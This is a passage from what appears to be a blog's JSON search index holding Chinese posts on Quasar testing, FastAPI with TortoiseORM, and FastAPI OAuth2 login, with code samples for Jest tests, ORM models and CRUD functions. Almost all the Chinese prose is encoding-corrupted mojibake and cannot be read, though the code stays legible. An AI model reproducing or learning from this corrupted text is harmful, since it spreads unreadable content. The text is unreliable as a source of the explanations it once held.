æŒ‡å—","uri":"/quasar-test/"},{"categories":["å‰ç«¯"],"content":"å®‰è£… å¯ä»¥è£…æµ‹è¯•å¥—ä»¶ç®¡ç†å·¥å…·æ¥ç®¡ç†æ‰€æœ‰å®‰è£…çš„æµ‹è¯•å¥—ä»¶ï¼Œä¹Ÿå¯ä»¥å•ç‹¬å®‰è£…æŸä¸ªç‰¹å®šçš„æµ‹è¯•å¥—ä»¶ã€‚æ²¡æœ‰å¤ªå¤§çš„åŒºåˆ«ï¼Œå‰è€…å¯èƒ½æ›´æ–¹ä¾¿ç‚¹ã€‚ ","date":"2021-03-21","objectID":"/quasar-test/:2:0","tags":["Quasar"],"title":"èƒ¸æœ‰æˆç«¹ï¼šQuasar Testing æŒ‡å—","uri":"/quasar-test/"},{"categories":["å‰ç«¯"],"content":"æµ‹è¯•å¥—ä»¶ç®¡ç†å·¥å…· $ quasar ext add @quasar/testing å®‰è£…æ—¶ä¼šè®©ä½ é€‰æ‹©è¦å®‰è£…çš„æµ‹è¯•å¥—ä»¶ï¼Œå¹¶ä¸”ä¼šæä¾› quasar test å‘½ä»¤æ–¹ä¾¿è·‘æµ‹è¯•ï¼Œæ¯”å¦‚ï¼š # Execute Jest tests $ quasar test --unit jest # Execute Cypress tests $ quasar test --e2e cypress # Execute Jest, Cypress and Security tests $ quasar test --unit jest --e2e cypress --security è¿™äº›å‘½ä»¤çš„æ›´åº•å±‚çš„å‘½ä»¤å®é™…ä¸Šå†™åœ¨äº† quasar.testing.json é‡Œï¼Œå¹¶ä¸”æ·»åŠ æ–°å¥—ä»¶ä¹‹åè¿™ä¸ªé…ç½®æ–‡ä»¶ä¹Ÿä¼šæ›´æ–°ã€‚æ–‡ä»¶ä¸­çš„é»˜è®¤å‘½ä»¤éƒ½å¯ä»¥åœ¨ CI ä¸­ä½¿ç”¨ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœè£…äº† Jest å¥—ä»¶å’Œ Cypress å¥—ä»¶ï¼Œé‚£é…ç½®æ–‡ä»¶å°±æ˜¯è¿™æ ·çš„ï¼š // quasar.testing.json { \"e2e-cypress\": { \"runnerCommand\": \"yarn test:e2e:ci\" }, \"unit-jest\": { \"runnerCommand\": \"yarn test:unit:ci\" } } æ³¨æ„è¿™é‡Œè°ƒç”¨äº† package.json è„šæœ¬ï¼Œåè€…çš„åº•å±‚å‘½ä»¤å°±æ˜¯å¥—ä»¶æœ¬èº«çš„å‘½ä»¤ï¼Œæ¯”å¦‚ jest --ci ç­‰ã€‚ å¦å¤–ï¼Œå¼€å‘ä¸åŒçš„ mode æ—¶å¯èƒ½éœ€è¦å˜æ›´ä¼ ç»™ quasar dev çš„å‚æ•°ï¼Œå¦‚æœæƒ³åœ¨æµ‹è¯•çš„æ—¶å€™ä¹Ÿè¿™æ ·åšï¼Œå¯ä»¥ç”¨ --dev é€‰é¡¹ï¼Œæ¯”å¦‚ï¼š # Run jest \u0026\u0026 dev server in pwa mode $ quasar test --unit jest --dev=\"-m pwa\" ","date":"2021-03-21","objectID":"/quasar-test/:2:1","tags":["Quasar"],"title":"èƒ¸æœ‰æˆç«¹ï¼šQuasar Testing æŒ‡å—","uri":"/quasar-test/"},{"categories":["å‰ç«¯"],"content":"å•ç‹¬å®‰è£… ä»¥å®‰è£… Jest å¥—ä»¶ä¸ºä¾‹ï¼š $ quasar ext add @quasar/testing-unit-jest æ­¤æ—¶æ²¡æœ‰ quasar test å‘½ä»¤ï¼Œä½†è¿˜æ˜¯å¯ä»¥ç”¨ package.json è„šæœ¬å’Œå¥—ä»¶æœ¬èº«çš„å‘½ä»¤ã€‚ ","date":"2021-03-21","objectID":"/quasar-test/:2:2","tags":["Quasar"],"title":"èƒ¸æœ‰æˆç«¹ï¼šQuasar Testing æŒ‡å—","uri":"/quasar-test/"},{"categories":["å‰ç«¯"],"content":"ç§»é™¤ è¦ç§»é™¤ä¸€ä¸ªæµ‹è¯•å¥—ä»¶ï¼ˆä¾‹å¦‚ Jestï¼‰ï¼Œå¯ä»¥è¿è¡Œï¼š $ quasar ext remove @quasar/testing-unit-jest æ­¤æ—¶ä¼šåˆ é™¤ç›¸åº”çš„ node æ¨¡å—ï¼Œç„¶åè°ƒç”¨ Quasar çš„ App Extension å¸è½½é’©å­ã€‚ ","date":"2021-03-21","objectID":"/quasar-test/:3:0","tags":["Quasar"],"title":"èƒ¸æœ‰æˆç«¹ï¼šQuasar Testing æŒ‡å—","uri":"/quasar-test/"},{"categories":["å‰ç«¯"],"content":"é‡ç½® ä¸ç”¨ç§»é™¤ï¼Œç›´æ¥é‡æ–°è£…ä¸€æ¬¡ï¼š $ quasar ext add @quasar/testing-unit-jest æ³¨æ„è¿™æ ·ä¼šè¦†ç›–æ‰æ‰€æœ‰ç›¸å…³æ–‡ä»¶ï¼ŒåŒ…æ‹¬é…ç½®æ–‡ä»¶ï¼Œè®°å¾—å¤‡ä»½ã€‚åŒæ—¶ä¹Ÿä¼šå‡çº§å¯¹åº”çš„ node æ¨¡å—ã€‚å¦‚æœä¸æƒ³å‡çº§ node æ¨¡å—ï¼Œå¯ä»¥è¿è¡Œï¼š $ quasar ext invoke @quasar/testing-unit-jest ","date":"2021-03-21","objectID":"/quasar-test/:4:0","tags":["Quasar"],"title":"èƒ¸æœ‰æˆç«¹ï¼šQuasar Testing æŒ‡å—","uri":"/quasar-test/"},{"categories":["å‰ç«¯"],"content":"æ›´æ–° ç›´æ¥å‡çº§ node æ¨¡å—å°±å¯ä»¥äº†ï¼š $ yarn add -D @quasar/quasar-app-extension-testing-unit-jest è¿™æ ·ä¸ä¼šå½±å“ç°æœ‰çš„æµ‹è¯•å’Œé…ç½®æ–‡ä»¶ã€‚ ","date":"2021-03-21","objectID":"/quasar-test/:5:0","tags":["Quasar"],"title":"èƒ¸æœ‰æˆç«¹ï¼šQuasar Testing æŒ‡å—","uri":"/quasar-test/"},{"categories":["å‰ç«¯"],"content":"æ›´æ–°å¤§ç‰ˆæœ¬ ç”±äºå¤§ç‰ˆæœ¬æ›´æ–°å¯èƒ½æ”¹å˜é…ç½®æ–‡ä»¶ï¼Œå»ºè®®ç§»é™¤åé‡è£…ä¸€ä¸‹ï¼š $ quasar ext remove @quasar/testing-unit-jest $ quasar ext add @quasar/testing-unit-jest å®‰è£…æ—¶é€‰ Overwrite allï¼Œæœ€å git diff ä¸€ä¸‹çœ‹çœ‹æ”¹äº†å“ªäº›åœ°æ–¹ä»¥åŠéœ€è¦è¿˜åŸå“ªäº›åœ°æ–¹ã€‚ ","date":"2021-03-21","objectID":"/quasar-test/:5:1","tags":["Quasar"],"title":"èƒ¸æœ‰æˆç«¹ï¼šQuasar Testing æŒ‡å—","uri":"/quasar-test/"},{"categories":["å‰ç«¯"],"content":"é—®é¢˜ @quasar/testing æ˜¯åŸºäº Jest 26 å’Œ @vue/test-utils çš„ï¼Œæ‰€ä»¥æš‚æ—¶ä¸æ”¯æŒ Vue 3ã€‚ç¼–å†™æµ‹è¯•æ—¶ï¼Œé¦–å…ˆéœ€è¦ç”¨ mountQuasar æˆ–è€… mountFactory æä¾›ä¸€ä¸ª Quasar æ¡†æ¶çš„ç¯å¢ƒå¹¶æŒ‚è½½ç»„ä»¶ï¼Œç„¶ååœ¨ options å‚æ•°ä¸­ï¼ŒæŒ‡å®šç»„ä»¶éœ€è¦ç”¨åˆ°çš„ Quasar ç»„ä»¶ã€‚æ¯”å¦‚æµ‹ä¸€ä¸ªæœ€ç®€å•çš„ 404 é¡µé¢ï¼š import { mountFactory } from '@quasar/quasar-app-extension-testing-unit-jest' import { QBtn } from 'quasar' import Error404 from 'pages/Error404.vue' const factory = mountFactory(Error404, { quasar: { components: { QBtn }, }, }) describe('Error404', () =\u003e { test('shows correct info', () =\u003e { const wrapper = factory() const info = wrapper.get('[dt=\"info\"]') expect(info.text()).toContain(' é¡µé¢æ‰¾ä¸åˆ°äº†') }) }) éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨æµ‹è¯•ä½¿ç”¨ QPage ç»„ä»¶æ—¶ï¼Œéœ€è¦æä¾›åŸæœ¬ç”±ä¸Šå±‚ QLayout æä¾›çš„ä¸€äº›å‚æ•°ã€‚è¿™é‡Œå¯ä»¥ç”¨ qLayoutInjections æ¥å®ç°ï¼š import { mountFactory, qLayoutInjections, } from '@quasar/quasar-app-extension-testing-unit-jest' import Login from 'pages/Login.vue' const factory = mountFactory(Login, { mount: { provide: qLayoutInjections(), // ... }, // ... }) éšåï¼Œå¯¹äºä¸€äº› Vue æ’ä»¶æ¯”å¦‚ VueRouterã€Vuex è¿˜æœ‰ VueCompositionApi ç­‰ç­‰ï¼Œå¯ä»¥é€šè¿‡ plugins å¼•å…¥ã€‚å‰ä¸¤è€…è¿˜éœ€è¦åœ¨ mount ä¸­æŒ‡å®šç»™å½“å‰çš„ localVueï¼ˆè¿™ç§æ–¹å¼ä¸éœ€è¦ createLocalVueï¼‰ã€‚ import { mountFactory, qLayoutInjections, } from '@quasar/quasar-app-extension-testing-unit-jest' import VueCompositionApi from '@vue/composition-api' import VueRouter from 'vue-router' import Vuex from 'vuex' import Router from 'src/router' import Store from 'src/store' import Login from 'pages/Login.vue' const factory = mountFactory(Login, { plugins: [VueCompositionApi, VueRouter, Vuex], mount: { router: Router, store: Store, provide: qLayoutInjections(), // ... }, // ... }) æœ€ååˆ™æ˜¯å¤„ç† @quasar/testing çš„ ä¸€ä¸ª bugï¼Œå°†æ¶‰åŠåˆ° Quasar Portal çš„ç»„ä»¶ mock æ‰ï¼Œå¦åˆ™ä¼šå› ä¸ºæ— æ³•è®¿é—® Vue å®ä¾‹ä¸Šçš„ $q è€ŒæŠ¥ warningã€‚ import { mountFactory, qLayoutInjections, } from '@quasar/quasar-app-extension-testing-unit-jest' import VueCompositionApi from '@vue/composition-api' import VueRouter from 'vue-router' import Vuex from 'vuex' import Router from 'src/router' import Store from 'src/store' import { // ..., Notify, } from 'quasar' import Login from 'pages/Login.vue' Notify.create = jest.fn() const factory = mountFactory(Login, { plugins: [VueCompositionApi, VueRouter, Vuex], mount: { router: Router, store: Store, provide: qLayoutInjections(), mocks: { Notify }, }, quasar: { components: { // ... }, }, }) describe('Login', () =\u003e { // ... }) ","date":"2021-03-21","objectID":"/quasar-test/:6:0","tags":["Quasar"],"title":"èƒ¸æœ‰æˆç«¹ï¼šQuasar Testing æŒ‡å—","uri":"/quasar-test/"},{"categories":["æ¢ç´¢"],"content":"å‚è€ƒäº† è¿™ä¸ª repo å’Œ å®˜æ–¹æ–‡æ¡£ï¼Œè¸©äº†ä¸€äº›å‘åè§‰å¾—æœ‰å¿…è¦è®°å½•ä¸‹æ¥ã€‚ ","date":"2021-01-27","objectID":"/fastapi-tortoise/:0:0","tags":["Python","FastAPI","é¡¹ç›®"],"title":"å„å¸å…¶èŒï¼šFastAPI + TortoiseORM å®ç°å¼‚æ­¥ DB æ“ä½œ","uri":"/fastapi-tortoise/"},{"categories":["æ¢ç´¢"],"content":"ç›®å½•ç»“æ„ app/ |--app.db |--requirements.txt |--initialize.py |--main.py |--Database/ | |--models.py |--Projects/ | |--crud.py | |--projects.py | |--schemas.py æ— å…³ç›®å½•æœªåˆ—å‡ºã€‚ ","date":"2021-01-27","objectID":"/fastapi-tortoise/:1:0","tags":["Python","FastAPI","é¡¹ç›®"],"title":"å„å¸å…¶èŒï¼šFastAPI + TortoiseORM å®ç°å¼‚æ­¥ DB æ“ä½œ","uri":"/fastapi-tortoise/"},{"categories":["æ¢ç´¢"],"content":"åˆå§‹åŒ– é¦–å…ˆåœ¨ main.py ä¸­å¯¹åˆå§‹åŒ–æµç¨‹è¿›è¡Œäº†å°è£…ï¼š from fastapi import FastAPI from Config.openapi import title, desc, version, docs_url from initializer import init app = FastAPI( title=title, description=desc, version=version, docs_url=docs_url ) init(app) åœ¨ init() ä¸­ä¼šæ‰§è¡Œè®¸å¤šåˆå§‹åŒ–æ“ä½œï¼š def init(app: FastAPI): init_middleware(app) init_db(app) init_routers(app) # ... æ³¨æ„è¿™é‡Œ init_routers() åœ¨ init_db() åé¢æ‰§è¡Œï¼Œä¹‹åä¼šæåˆ°è¿™æ ·åšçš„å¥½å¤„ã€‚è€Œ init_db() å‡½æ•°æ¯”è¾ƒç®€å•ï¼š from fastapi import FastAPI from tortoise import Tortoise from tortoise.contrib.fastapi import register_tortoise from Config import tortoise def init_db(app: FastAPI): register_tortoise( app, db_url=tortoise.db_url, generate_schemas=tortoise.gen_schemas, modules=tortoise.modules ) Tortoise.init_models(['Database.models'],'models') Tortoise ORM æä¾›äº† register-tortoise å‡½æ•°ï¼Œæ–¹ä¾¿æˆ‘ä»¬åœ¨æœåŠ¡å™¨å¯åŠ¨å’Œå…³é—­æ—¶ï¼Œå¯¹ ORM æœåŠ¡è¿›è¡Œå¯åŠ¨ã€å…³é—­ã€‚è¿™é‡Œä¼ å…¥çš„é…ç½®å¦‚ä¸‹ï¼š db_url = \"sqlite://app.db\" gen_schemas = True modules = {\"models\": [\"Database.models\"]} æµ‹è¯•ç¯å¢ƒä¸‹é‡‡ç”¨ sqlite3 ä½œä¸ºæ•°æ®åº“ï¼Œå¹¶å£°æ˜è‡ªåŠ¨ç”Ÿæˆæ•°æ®åº“ schemasã€‚åœ¨ modules ä¸­ï¼ŒæŒ‡å®š app_name ä¸º modelsï¼Œå‘Šè¯‰ Tortoise åˆ° Database.models æ–‡ä»¶ä¸­å¯»æ‰¾éœ€è¦çš„æ•°æ®åº“æ¨¡å‹ã€‚ æœ€åï¼Œéœ€è¦æ³¨æ„ä¸»åŠ¨è°ƒç”¨ init_models æ–¹æ³•è¿›è¡Œ Early-initï¼Œè¿™æ˜¯ä¸ºäº†ä¿è¯ Database.models ä¸­çš„æ¨¡å‹éƒ½èƒ½è¢«åŠæ—¶åˆå§‹åŒ–ã€‚å¦åˆ™ï¼Œç”Ÿæˆçš„ Pydantic Models ææœ‰å¯èƒ½ä¼šä¸¢å¤± Relations ç›¸å…³çš„å­—æ®µã€‚ å…³äºè¿™ä¸€ç‚¹ï¼Œæ–‡æ¡£ä¸­ç»™å‡ºäº† æ›´è¯¦å°½çš„æè¿°ã€‚ é—æ†¾çš„æ˜¯ï¼Œæ–‡æ¡£ä¸­ FastAPI Examples éƒ¨åˆ†å¹¶æ²¡æœ‰ä½“ç°è¯¥é—®é¢˜ï¼Œå› ä¸ºç»™å‡ºçš„ä¾‹å­æ²¡æœ‰ç”¨åˆ° Relations ç›¸å…³ APIï¼Œä¸å—å½±å“ã€‚ ","date":"2021-01-27","objectID":"/fastapi-tortoise/:2:0","tags":["Python","FastAPI","é¡¹ç›®"],"title":"å„å¸å…¶èŒï¼šFastAPI + TortoiseORM å®ç°å¼‚æ­¥ DB æ“ä½œ","uri":"/fastapi-tortoise/"},{"categories":["æ¢ç´¢"],"content":"å®šä¹‰æ•°æ®åº“æ¨¡å‹ Tortoise ORM èƒ½å¤Ÿå¾ˆå¥½çš„æ”¯æŒ Pydanticï¼Œç”šè‡³å¯ä»¥ç›´æ¥é€šè¿‡å®šä¹‰çš„æ•°æ®åº“æ¨¡å‹ç”Ÿæˆ Pydantic Modelsï¼Œå¹¶æä¾›é¢å¤–çš„æ¨¡å‹è½¬æ¢æ–¹æ³•ã€‚ è¿™é‡Œæˆ‘ä»¬ä»¥æ¯”è¾ƒç®€å•çš„ Project å¯¹è±¡ä¸ºä¾‹ï¼Œåœ¨ Database/models.py ä¸­åˆ›å»ºæ¨¡å‹ï¼š from tortoise.fields import IntField, CharField, DatetimeField, ForeignKeyField from tortoise.models import Model class Projects(Model): id = IntField(pk=True) name = CharField(255) ç”±äºå¯¹äºæ¯ä¸ª Project éƒ½å¯èƒ½å‘èµ·å¤šæ¬¡ Scan ï¼Œå®šä¹‰ Scan æ¨¡å‹æ—¶å¯ä»¥ä½¿ç”¨ä¸€ä¸ªå¤–é”®çº¦æŸï¼š class Scans(Model): id = IntField(pk=True) type = CharField(30) target = CharField(255) status = CharField(10) created_at = DatetimeField(auto_now_add=True) project = ForeignKeyField('models.Projects', related_name='scans') å¤–é”®çº¦æŸçš„æ ¼å¼æ˜¯ {app_name}.{model_name}ï¼Œå‚æ•° related_name ä»£è¡¨åœ¨ Project ä¸­æŸ¥è¯¢å¯¹åº”çš„ Scan æ—¶æ‰€ä½¿ç”¨çš„åå­—ã€‚è¿™æ ·åœ¨æŸ¥è¯¢ä¸­å°±å¯ä»¥ç”¨ Scans.project å’Œ Projects.scans è¿›è¡Œæ­£åå‘å¼•ç”¨äº†ã€‚ å®é™…ä¸Šï¼Œè¿™é‡Œçš„ project å­—æ®µåœ¨æ•°æ®åº“ä¸­è¢«æ›¿ä»£ä¸º project_idï¼ŒæŸ¥è¯¢ Scans æ—¶ä¼šæ ¹æ®å¾—åˆ°çš„ project_id ç»§ç»­åœ¨ Projects è¡¨ä¸­æŸ¥è¯¢ç»“æœï¼Œæ¯«æ— ç–‘é—®è¿™ä¼šå¸¦æ¥é¢å¤–çš„å¼€é”€ï¼Œä½†åŒæ—¶ä¹Ÿæé«˜äº†å¼€å‘æ•ˆç‡ã€‚ ","date":"2021-01-27","objectID":"/fastapi-tortoise/:3:0","tags":["Python","FastAPI","é¡¹ç›®"],"title":"å„å¸å…¶èŒï¼šFastAPI + TortoiseORM å®ç°å¼‚æ­¥ DB æ“ä½œ","uri":"/fastapi-tortoise/"},{"categories":["æ¢ç´¢"],"content":"å®šä¹‰ Pydantic Models æ¥ä¸‹æ¥åœ¨ Projects/schemas.py ä¸­åˆ›å»º Pydantic Modelsï¼ŒScans åŒç†ï¼š from Database.models import Projects from tortoise.contrib.pydantic import pydantic_model_creator Project = pydantic_model_creator(Projects, name='Project') ProjectIn = pydantic_model_creator( Projects, name='ProjectIn', exclude_readonly=True) ä¸ºä»€ä¹ˆè¦åœ¨ Projects.schemas ä¸‹æ‰åˆ›å»º Pydantic Modelsï¼Ÿå› ä¸ºä¸Šæ–‡æåˆ°ï¼Œæˆ‘ä»¬å¿…é¡»ç¡®ä¿åœ¨ Tortoise.init_models() æ‰§è¡Œåï¼Œæ‰æ‰§è¡Œ pydantic_model_creator()ã€‚ç”±äº Projects/ ç›®å½•ä¸‹çš„å†…å®¹ä¼šåœ¨ init_router() ä¸­æ‰§è¡Œï¼Œå› æ­¤å°† init_router() æ”¾åœ¨ init_db() åå°±èƒ½å¤Ÿç¡®ä¿è¿™ä¸€ç‚¹ã€‚ è¿™æ ·ä»¥åï¼Œå¤§æ¦‚å¯ä»¥å¾—åˆ° Project çš„ç»“æ„å¦‚ä¸‹ï¼š { id: int, name: str, scans: List[Scan] } è€Œ Scan çš„ç»“æ„å¦‚ä¸‹ï¼š { id: int, type: str, target: str, status: str, created_at: Datetime, project: Project } å®¹æ˜“å‘ç°è¿™é‡Œå‡ºç°äº†ä¸€ä¸ªé€’å½’å¼•ç”¨çš„é—®é¢˜ï¼Œå¥½åœ¨ Tortoise ORM ä¼šè‡ªåŠ¨å¸®æˆ‘ä»¬è§£å†³è¿™ç±»é—®é¢˜ã€‚çœŸæ­£çš„é—®é¢˜åœ¨äºï¼šè™½ç„¶å¯¹ Scan è¿›è¡Œ CRUD æ—¶ï¼Œå¸¸å¸¸ä¼šéœ€è¦å…¶å¯¹åº”çš„ Projectï¼Œä½†å¯¹ Project è¿›è¡Œ CRUD æ—¶ï¼Œé€šå¸¸ä¸éœ€è¦äº†è§£å®ƒå¯¹åº”ç€å“ªäº› Scanï¼Œè€Œæ˜¯å…³å¿ƒå…¶æœ¬èº«çš„å±æ€§ã€‚ å› æ­¤æˆ‘ä»¬é‡æ–°å®šä¹‰ Database.models.Projectsï¼Œè®©å®ƒä¸å†è¿”å› scans å­—æ®µ: class Projects(Model): id = IntField(pk=True) name = CharField(255) class PydanticMeta: exclude = ['scans'] è¿™é‡Œçš„ PydanticMeta ç±»å¯¹äºé…ç½®è‡ªåŠ¨ç”Ÿæˆçš„ Pydantic Models éå¸¸æœ‰ç”¨ï¼Œç„¶è€Œç›®å‰æ–‡æ¡£å°šä¸å®Œå–„ï¼Œå› æ­¤è®°å½•ä¸€ä¸‹å¯é€‰çš„é…ç½®ï¼š class PydanticMeta: \"\"\" The ``PydanticMeta`` class is used to configure metadata for generating the pydantic Model. Usage: .. code-block:: python3 class Foo(Model): ... class PydanticMeta: exclude = (\"foo\", \"baa\") computed = (\"count_peanuts\",) \"\"\" #: If not empty, only fields this property contains will be in the pydantic model include: Tuple[str, ...] = () #: Fields listed in this property will be excluded from pydantic model exclude: Tuple[str, ...] = () #: Computed fields can be listed here to use in pydantic model computed: Tuple[str, ...] = () #: Use backward relations without annotations - not recommended, it can be huge data #: without control backward_relations: bool = True #: Maximum recursion level allowed max_recursion: int = 3 #: Allow cycles in recursion - This can result in HUGE data - Be careful! #: Please use this with ``exclude``/``include`` and sane ``max_recursion`` allow_cycles: bool = False #: If we should exclude raw fields (the ones have _id suffixes) of relations exclude_raw_fields: bool = True #: Sort fields alphabetically. #: If not set (or ``False``) then leave fields in declaration order sort_alphabetically: bool = False ","date":"2021-01-27","objectID":"/fastapi-tortoise/:4:0","tags":["Python","FastAPI","é¡¹ç›®"],"title":"å„å¸å…¶èŒï¼šFastAPI + TortoiseORM å®ç°å¼‚æ­¥ DB æ“ä½œ","uri":"/fastapi-tortoise/"},{"categories":["æ¢ç´¢"],"content":"ç¼–å†™ç®€å• CRUD æ­£ç¡®è¿›è¡Œé…ç½®åï¼Œå¯ä»¥å°è¯•å†™ CRUD æ¥è¿›è¡Œæµ‹è¯•äº†ï¼š from Database.models import Projects from .schemas import Project, ProjectIn async def get_all(): return await Project.from_queryset(Projects.all()) async def get(id: int): return await Project.from_queryset_single(Projects.get(id=id)) async def create(param: ProjectIn): target = await Projects.create(**param.dict()) return await Project.from_tortoise_orm(target) async def edit(id: int, param: ProjectIn): await Projects.get(id=id).update(**param.dict()) return async def delete(id: int): await Projects.get(id=id).delete() return Tortoise ORM ç”Ÿæˆçš„ Pydantic Models å¯ä»¥ä½¿ç”¨ç±»ä¼¼ from_queryset() ä¹‹ç±»çš„æ–¹æ³•æ¥è½¬æ¢æ•°æ®åº“æŸ¥è¯¢å¾—åˆ°çš„ç»“æœï¼Œååˆ†æ–¹ä¾¿ã€‚ ","date":"2021-01-27","objectID":"/fastapi-tortoise/:5:0","tags":["Python","FastAPI","é¡¹ç›®"],"title":"å„å¸å…¶èŒï¼šFastAPI + TortoiseORM å®ç°å¼‚æ­¥ DB æ“ä½œ","uri":"/fastapi-tortoise/"},{"categories":["æ¢ç´¢"],"content":"å†™ Pianoforte æ—¶ç¬¬ä¸€ä¸ªé‡åˆ°çš„å¯å¤ç”¨æ¨¡å—ã€‚ æœ€è¿‘åœ¨é€šè¿‡é¡¹ç›®å­¦ä¹  FastAPIï¼Œå‘ç°ç™»å½•è®¤è¯æ¨¡å—å¯ä»¥å¤ç”¨ï¼Œäºæ˜¯è®°å½•ä¸€ä¸‹ã€‚ä»£ç ä¸»è¦ä¿®æ”¹è‡ª å®˜æ–¹æ–‡æ¡£ã€‚ ","date":"2021-01-10","objectID":"/fastapi-auth/:0:0","tags":["Python","FastAPI","è®¤è¯","JWT","é¡¹ç›®"],"title":"ä¹…ä»°å¤§åï¼šåŸºäº FastAPI å®ç° OAuth2 ç™»å½•è®¤è¯","uri":"/fastapi-auth/"},{"categories":["æ¢ç´¢"],"content":"ç›®å½•ç»“æ„ . |--app.db |--requirements.txt |--app/ | |--__init__.py | |--config.py | |--db.py | |--main.py | |--models.py | |--projects/ | |--users/ | | |--__init__.py | | |--auth.py | | |--config.py | | |--crud.py | | |--schemas.py | | |--users.py æœ€å¤–å±‚æ˜¯ sqlite æ•°æ®åº“æ–‡ä»¶å’Œä¾èµ–ï¼Œprojects/ ç›®å½•å’Œä¸»é¢˜æ— å…³å› æ­¤æœªåˆ—å‡ºã€‚ ","date":"2021-01-10","objectID":"/fastapi-auth/:1:0","tags":["Python","FastAPI","è®¤è¯","JWT","é¡¹ç›®"],"title":"ä¹…ä»°å¤§åï¼šåŸºäº FastAPI å®ç° OAuth2 ç™»å½•è®¤è¯","uri":"/fastapi-auth/"},{"categories":["æ¢ç´¢"],"content":"ç°æœ‰ä»£ç  ","date":"2021-01-10","objectID":"/fastapi-auth/:2:0","tags":["Python","FastAPI","è®¤è¯","JWT","é¡¹ç›®"],"title":"ä¹…ä»°å¤§åï¼šåŸºäº FastAPI å®ç° OAuth2 ç™»å½•è®¤è¯","uri":"/fastapi-auth/"},{"categories":["æ¢ç´¢"],"content":"main.py from fastapi import Depends, FastAPI, HTTPException from fastapi.middleware.cors import CORSMiddleware from .db import engine from . import models, config from .users import users, auth from .projects import projects models.Base.metadata.create_all(bind=engine) app = FastAPI( title='Pianoforte', description='Pianoforte Is AN Offensive Framework Of Red TEam', version='0.1.0' ) app.add_middleware( CORSMiddleware, allow_origins=config.allow_origins, allow_credentials=True, allow_methods=config.allow_methods, allow_headers=['*'] ) app.include_router(users.router, prefix='/users', tags=['users']) auth_needed = [Depends(auth.get_current_user)] app.include_router(projects.router, prefix='/projects', tags=['projects'], dependencies=auth_needed) é¦–å…ˆæ ¹æ® models.py ä¸­çš„å®šä¹‰åˆ›å»ºäº†æ•°æ®åº“ï¼Œæ•°æ®åº“ç›¸å…³ä»£ç åœ¨ db.py ä¸­ã€‚éšåæ·»åŠ  CORS ä¸­é—´ä»¶ï¼Œå¹¶æ·»åŠ  users è·¯ç”±å’Œ projects è·¯ç”±ï¼Œåè€…éœ€è¦è®¤è¯åæ–¹èƒ½è®¿é—®ã€‚æˆ‘ä»¬é€šè¿‡ Dependency çš„æ–¹å¼ï¼Œè¦æ±‚ auth.get_current_user å‡½æ•°è¿è¡Œæ­£å¸¸æ‰èƒ½è®¿é—® projects è·¯ç”±ï¼Œç”±æ­¤å®ç°æƒé™ç®¡ç†ã€‚ ","date":"2021-01-10","objectID":"/fastapi-auth/:2:1","tags":["Python","FastAPI","è®¤è¯","JWT","é¡¹ç›®"],"title":"ä¹…ä»°å¤§åï¼šåŸºäº FastAPI å®ç° OAuth2 ç™»å½•è®¤è¯","uri":"/fastapi-auth/"},{"categories":["æ¢ç´¢"],"content":"db.py from sqlalchemy import create_engine from sqlalchemy.ext.declarative import declarative_base from sqlalchemy.orm import sessionmaker SQLALCHEMY_DATABASE_URL = \"sqlite:///./app.db\" # SQLALCHEMY_DATABASE_URL = \"postgresql://user:password@postgresserver/db\" engine = create_engine( SQLALCHEMY_DATABASE_URL, connect_args={\"check_same_thread\": False} ) SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine) Base = declarative_base() def get_db(): db = SessionLocal() try: yield db finally: db.close() ç”±äºé¡¹ç›®è§„æ¨¡ä¸å¤§ï¼Œé€‰ç”¨ sqlite3 æ•°æ®åº“é…åˆ sqlalchemy çš„ ORM åŠŸèƒ½è¿›è¡Œæ•°æ®åº“æ“ä½œã€‚ æ­¤å¤„ yield æ–¹å¼è¿”å›æ•°æ®åº“ Session éœ€è¦ Python 3.7 åŠä»¥ä¸Šã€‚ ","date":"2021-01-10","objectID":"/fastapi-auth/:2:2","tags":["Python","FastAPI","è®¤è¯","JWT","é¡¹ç›®"],"title":"ä¹…ä»°å¤§åï¼šåŸºäº FastAPI å®ç° OAuth2 ç™»å½•è®¤è¯","uri":"/fastapi-auth/"},{"categories":["æ¢ç´¢"],"content":"models.py from sqlalchemy import Column, Integer, String from .db import Base class User(Base): __tablename__ = 'users' id = Column(Integer, primary_key=True, index=True) username = Column(String, unique=True) password = Column(String) è¿™é‡Œä»…å±•ç¤ºäº†ç›¸å…³ä»£ç ï¼Œå³ User ç±»çš„å­—æ®µã€‚è¿™ä¸€æ®µä»£ç åœ¨æ•°æ®åº“ä¸­åˆ›å»ºäº† users è¡¨æ¥å­˜æ”¾ç”¨æˆ·æ•°æ®ã€‚ ç”±äºä¸šåŠ¡éœ€è¦ï¼Œé™å®š username ä¸èƒ½é‡å¤ã€‚ ","date":"2021-01-10","objectID":"/fastapi-auth/:2:3","tags":["Python","FastAPI","è®¤è¯","JWT","é¡¹ç›®"],"title":"ä¹…ä»°å¤§åï¼šåŸºäº FastAPI å®ç° OAuth2 ç™»å½•è®¤è¯","uri":"/fastapi-auth/"},{"categories":["æ¢ç´¢"],"content":"users/schemas.py ä¸Šé¢çš„ models.py å®šä¹‰äº†æ•°æ®åº“ä¸­çš„ User ç±»ï¼Œè€Œåœ¨æœ¬æ–‡ä»¶ä¸­å®šä¹‰äº†ä¸¤ç§è¯­ä¹‰ä¸‹çš„ User ç±»ï¼š from pydantic import BaseModel class UserBase(BaseModel): username: str class UserCreate(UserBase): password: str class User(UserBase): id: int class Config: orm_mode = True å…¶ä¸€æ˜¯åœ¨æ³¨å†Œä¸ç™»å½•æ—¶ä½¿ç”¨çš„ UserCreate ç±»ï¼Œæ­¤æ—¶ä¸éœ€è¦ä¼ è¾“ idï¼›å…¶äºŒæ˜¯åœ¨è·å–ç”¨æˆ·ä¿¡æ¯æ—¶è¿”å›çš„ User ç±»ï¼Œæ­¤æ—¶ä¸éœ€è¦ä¼ è¾“ password ä½†éœ€è¦ idã€‚ ","date":"2021-01-10","objectID":"/fastapi-auth/:2:4","tags":["Python","FastAPI","è®¤è¯","JWT","é¡¹ç›®"],"title":"ä¹…ä»°å¤§åï¼šåŸºäº FastAPI å®ç° OAuth2 ç™»å½•è®¤è¯","uri":"/fastapi-auth/"},{"categories":["æ¢ç´¢"],"content":"users/crud.py from sqlalchemy.orm import Session from ..models import User from . import schemas def get(db: Session, username: str): return db.query(User).filter_by(username=username).first() def create(db: Session, param: schemas.UserCreate): target = User(**param.dict()) db.add(target) db.commit() db.refresh(target) return target 